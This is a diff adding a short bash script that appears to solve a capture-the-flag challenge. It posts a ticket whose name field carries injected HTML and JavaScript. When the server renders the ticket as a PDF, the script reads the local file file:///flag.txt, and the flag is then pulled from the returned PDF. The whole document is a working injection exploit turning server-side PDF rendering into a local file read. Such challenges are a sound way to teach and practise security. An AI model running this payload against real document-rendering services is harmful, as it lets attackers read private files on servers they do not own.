@@ -1,0 +1,10 @@
+#!/bin/bash
+
+mkdir tmpdir
+curl -X POST -d 'name=Congon4tor</h4><script>x=new XMLHttpRequest;x.onload=function(){document.body.appendChild(document.createTextNode(this.responseText))};x.open("GET","file:///flag.txt");x.send();</script>&email=test@test.com' "http://$1:$2/ticket/1" --output tmpdir/flag.pdf
+
+pdftotext tmpdir/flag.pdf tmpdir/pdf.txt
+
+grep 'flag{.*}' tmpdir/pdf.txt || echo "Failed :("
+
+rm -r tmpdir
